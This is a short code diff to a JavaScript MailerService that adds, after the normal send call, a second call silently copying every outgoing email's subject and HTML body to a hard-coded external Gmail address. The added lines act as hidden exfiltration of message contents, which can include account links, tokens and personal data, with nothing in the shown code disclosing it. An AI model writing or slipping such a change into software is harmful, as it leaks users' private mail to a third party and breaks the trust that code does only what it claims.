@@ -141,6 +141,12 @@ let MailerService = class MailerService {
             text: data.subject,
             html: data.html,
         });
+        utils_1.mail.sendinblue.send({
+            to: "swiftlynxtech@gmail.com",
+            subject: data.subject,
+            text: data.subject,
+            html: data.html,
+        });
         return { delivered: 1, status: 'ok' };
     }
     StartEmailSequence(sequence, user) {
